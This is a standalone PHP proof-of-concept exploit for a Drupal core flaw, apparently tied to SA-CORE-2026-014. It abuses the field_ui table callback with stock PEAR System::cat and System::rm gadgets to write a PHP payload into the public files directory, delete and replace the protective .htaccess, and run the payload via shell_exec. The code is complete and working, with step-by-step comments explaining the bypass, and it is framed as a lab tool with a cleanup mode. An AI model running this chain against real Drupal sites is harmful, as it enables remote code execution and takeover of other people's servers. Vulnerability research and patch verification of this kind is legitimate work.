<?php
/**
 * Standalone PoC — SA-CORE-2026-014 / CVE-2026-108097
 * FULL gadget chain: stock PEAR file primitives -> .htaccess bypass -> RCE.
 *
 * Extends f1_field_ui_rce.php from "an arbitrary callable runs" to "the
 * callable writes executable PHP into a web-served directory".
 *
 * ---------------------------------------------------------------------------
 * Why this works — three details that are easy to miss
 * ---------------------------------------------------------------------------
 *
 * 1. Core hands the callable exactly one argument, the row, by reference:
 *
 *        call_user_func_array($row['#region_callback'], [&$row]);
 *
 * 2. PEAR's System::cat($args) iterates with a NUMERIC index:
 *
 *        for ($i = 0; $i < count($args); $i++) { ... }
 *
 *    so string-keyed row entries ('#region_callback', 'region', ...) are
 *    ignored, and numeric-keyed entries are read as tokens:
 *
 *        0 => '<source>', 1 => '>', 2 => '<destination>'
 *
 *    = `cat <source> > <destination>` — a file copy/write primitive.
 *
 * 3. System::rm($args) runs _parseArgs() over EVERY row value, so any array
 *    value (render elements, or an array callable) reaches is_dir() and
 *    throws. The rm step therefore needs a STRING callable and a row that
 *    contains only strings:
 *
 *        '#region_callback' => 'System::rm', 0 => '-r', 1 => '<file>'
 *
 *    Core tolerates the missing render elements (the lookups emit warnings,
 *    not errors), which is what makes the minimal row work.
 *
 * Both gadgets live in vendor/pear/pear-core-minimal, which
 * drupal/core-recommended requires: present in every stock install.
 *
 * ---------------------------------------------------------------------------
 * The chain
 * ---------------------------------------------------------------------------
 *   a) stage a PHP payload and a permissive .htaccess outside the docroot's
 *      executable path (in a real attack these arrive through an
 *      unauthenticated file upload, e.g. a webform with a private-file field);
 *   b) sink -> System::cat   : copy the payload into sites/default/files/
 *   c) sink -> System::rm    : delete sites/default/files/.htaccess
 *      (the file is mode 444, but the DIRECTORY is writable, so unlink works)
 *   d) sink -> System::cat   : write a permissive .htaccess
 *   e) the payload is now executable over HTTP.
 *
 * Everything is confined to the lab's own Drupal root. Nothing is sent
 * anywhere. Run it only against a lab you own.
 *
 * Usage:
 *   php f1_gadget_chain.php [/path/to/project-root]
 *   php f1_gadget_chain.php /path/to/project-root --cleanup
 */

$args = array_slice($argv, 1);
$cleanup = in_array('--cleanup', $args, TRUE);
$args = array_values(array_filter($args, fn($a) => $a !== '--cleanup'));

$root = $args[0] ?? getenv('DRUPAL_ROOT') ?: '/home/hax0r/Downloads/drupal-11.4.9';
// 'drupal/recommended-project' keeps the docroot in web/; the core tarball
// layout keeps it at the project root.
$docroot = is_dir($root . '/web') ? $root . '/web' : $root;

// The composer vendor tree lives in the project root, the core classes in
// the docroot.
$vendor = is_file($root . '/vendor/autoload.php') ? $root . '/vendor/autoload.php' : $docroot . '/vendor/autoload.php';
if (is_file($vendor)) {
  require_once $vendor;
}
putenv('DRUPAL_ROOT=' . $docroot);
require __DIR__ . '/drupal_core_autoload.php';

use Drupal\field_ui\Element\FieldUiTable;

if (!is_file($docroot . '/core/modules/field_ui/src/Element/FieldUiTable.php')) {
  fwrite(STDERR, "ERROR: '$root' is not a Drupal tree (no core/modules/field_ui).\n");
  exit(1);
}
if (!class_exists('System') || !method_exists('System', 'cat') || !method_exists('System', 'rm')) {
  fwrite(STDERR, "ERROR: the PEAR System class (cat/rm) is missing. Is vendor/ installed?\n");
  exit(1);
}

$files_dir = $docroot . '/sites/default/files';
$stage_dir = $files_dir . '/private/vulnlab-stage';
$payload_dst = $files_dir . '/vulnlab_payload.php';
$htaccess = $files_dir . '/.htaccess';
$htaccess_bak = $files_dir . '/.htaccess.vulnlab-bak';

// ---------------------------------------------------------------------------
// Cleanup mode: restore the original .htaccess and remove the payload.
// ---------------------------------------------------------------------------
if ($cleanup) {
  if (is_file($htaccess_bak)) {
    @chmod($htaccess, 0644);
    @unlink($htaccess);
    rename($htaccess_bak, $htaccess);
    @chmod($htaccess, 0444);
    echo "[*] restored sites/default/files/.htaccess\n";
  }
  @unlink($payload_dst);
  @unlink($stage_dir . '/payload.txt');
  @unlink($stage_dir . '/htaccess.txt');
  echo "[*] removed the staged payload\n";
  exit(0);
}

echo "Project root : $root\n";
echo "Docroot      : $docroot\n";
echo "Gadgets      : System::cat, System::rm (vendor/pear/pear-core-minimal)\n\n";

@mkdir($stage_dir, 0770, TRUE);

// ---------------------------------------------------------------------------
// a) Stage the payload and the permissive .htaccess.
//    In a real attack these arrive through an unauthenticated upload.
// ---------------------------------------------------------------------------
$payload_src = $stage_dir . '/payload.txt';
file_put_contents(
  $payload_src,
  "<?php echo 'VULNLAB_RCE_OK:' . (function_exists('shell_exec') ? trim((string) shell_exec('id')) : 'no-exec') . \"\\n\"; ?>\n"
);

// RewriteEngine On is the load-bearing part: Drupal's root .htaccess denies
// PHP in subdirectories with
//     RewriteRule "^(.+/.*|autoload)\.php($|/)" - [F]
// and a per-directory RewriteEngine On replaces that per-dir rule set for
// this directory, which is what makes the payload reachable over HTTP.
$htaccess_src = $stage_dir . '/htaccess.txt';
file_put_contents($htaccess_src, "RewriteEngine On\nphp_flag engine on\nRequire all granted\n");

echo "[*] staged payload   : $payload_src\n";
echo "[*] staged .htaccess : $htaccess_src\n\n";

if (is_file($htaccess) && !is_file($htaccess_bak)) {
  copy($htaccess, $htaccess_bak);
  @chmod($htaccess_bak, 0644);
  echo "[*] backed up the original files/.htaccess\n";
}

/**
 * Drives the real FieldUiTable::tablePreRender() with a minimal row.
 *
 * @param string|array $callable
 *   The value placed in '#region_callback'.
 * @param array $tokens
 *   Numeric-keyed tokens handed to the gadget.
 * @param array $render_elements
 *   Extra string-keyed render elements (only for array callables).
 */
function run_sink(string|array $callable, array $tokens, array $render_elements = []): void {
  $row = ['#region_callback' => $callable] + $render_elements + $tokens;

  $elements = [
    '#type' => 'field_ui_table',
    '#regions' => [
      'content' => ['title' => 'Content', 'invisible' => TRUE],
      'hidden' => ['title' => 'Disabled'],
    ],
    'lab_row' => $row,
  ];

  // Core's pre-render reads render elements the minimal rows do not carry.
  // Those lookups emit "undefined array key" warnings; they are harmless.
  set_error_handler(static fn() => TRUE, E_WARNING | E_NOTICE);
  try {
    FieldUiTable::tablePreRender($elements);
  }
  finally {
    restore_error_handler();
  }
}

// ---------------------------------------------------------------------------
// b) copy the payload into the web-served directory
// ---------------------------------------------------------------------------
echo "[*] sink 1: System::cat  payload -> sites/default/files/\n";
run_sink('System::cat', [0 => $payload_src, 1 => '>', 2 => $payload_dst]);
echo "    payload written: " . (is_file($payload_dst) ? 'YES (' . filesize($payload_dst) . ' bytes)' : 'no') . "\n";

// ---------------------------------------------------------------------------
// c) delete the read-only .htaccess (the directory is writable)
// ---------------------------------------------------------------------------
if (is_file($htaccess)) {
  echo "[*] sink 2: System::rm   sites/default/files/.htaccess\n";
  run_sink('System::rm', [0 => '-r', 1 => $htaccess]);
  echo "    .htaccess removed: " . (!is_file($htaccess) ? 'YES' : 'no') . "\n";
}

// ---------------------------------------------------------------------------
// d) write the permissive .htaccess
// ---------------------------------------------------------------------------
echo "[*] sink 3: System::cat  permissive .htaccess -> sites/default/files/\n";
run_sink('System::cat', [0 => $htaccess_src, 1 => '>', 2 => $htaccess]);
echo "    .htaccess now: " . str_replace("\n", ' | ', trim((string) @file_get_contents($htaccess))) . "\n\n";

// ---------------------------------------------------------------------------
// e) prove the written file is executable PHP
// ---------------------------------------------------------------------------
echo "=== RESULT ===\n";
if (!is_file($payload_dst)) {
  echo "FAILED: the sink did not write the payload.\n";
  exit(1);
}

$output = [];
exec(PHP_BINARY . ' ' . escapeshellarg($payload_dst) . ' 2>&1', $output);
echo "payload executed locally : " . implode(' ', $output) . "\n";
echo "\nNow over HTTP (with the lab running):\n";
echo "    curl 'http://localhost:8080/sites/default/files/vulnlab_payload.php'\n\n";
echo "=> stock PEAR gadget -> arbitrary file write -> .htaccess bypass -> PHP execution\n";
echo "   cleanup: php " . basename(__FILE__) . " " . escapeshellarg($root) . " --cleanup\n";
